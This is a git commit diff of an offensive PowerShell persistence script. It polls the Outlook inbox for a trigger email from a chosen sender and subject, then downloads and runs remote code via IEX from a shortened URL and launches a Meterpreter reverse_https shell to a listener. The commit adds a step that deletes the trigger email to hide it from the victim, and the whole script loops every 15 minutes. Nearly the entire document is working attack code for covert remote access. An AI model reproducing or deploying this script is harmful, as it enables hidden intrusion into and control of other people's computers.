e5d6bac0045ade6a63eae745d73f702592e64170
enigma0x3 <matthew@webnelson.net>
2014-10-14 11:49:19 -0400

    Update Persist.ps1

--- Persist.ps1
+++ Persist.ps1
@@ -1,19 +1,28 @@
-while($true){
+While($True){
 $olFolderInbox = 6
 $outlook = new-object -com outlook.application;
 $ns = $outlook.GetNameSpace("MAPI");
 $inbox = $ns.GetDefaultFolder($olFolderInbox)
-$inbox.items | foreach { 
-if($_.SenderEmailAddress -match "ATTACKEREMAIL@EMAIL.COM" -and $_.subject -match "SPECIFIEDSUBJECT")
+$Emails = $inbox.items
+$Emails | foreach { 
+if($_.SenderEmailAddress -match "enigma0x32@outlook.com" -and $_.subject -match "Hello")
 {$WebClientObject = New-Object Net.WebClient
 IEX $WebClientObject.DownloadString('http://goo.gl/yfLfQB')
-Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST xx.xx.x.xxx -LPORT 1111 -Force
-Return}
+Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST 10.0.0.13 -LPORT 1111 -Force
+Return
+
+}}
+$Emails | foreach { 
+if($_.SenderEmailAddress -match "enigma0x32@outlook.com" -and $_.subject -match "Hello")
+{$OutlookFolders = $outlook.Session.Folders.Item(1).Folders
+$EmailInFolderToDelete = $outlook.Session.Folders.Item(1).Folders.Item("Inbox").Items
+$EmailToDelete = $EmailInFolderToDelete | Where-Object {$_.Subject -eq "Hello" -and $_.SenderEmailAddress -eq "enigma0x32@outlook.com"}
+$EmailToDelete.Delete() }
+
+
+}
+  
+Start-Sleep -s 900  
   
 }
-
-start-sleep -s 900
-
-}
-
 
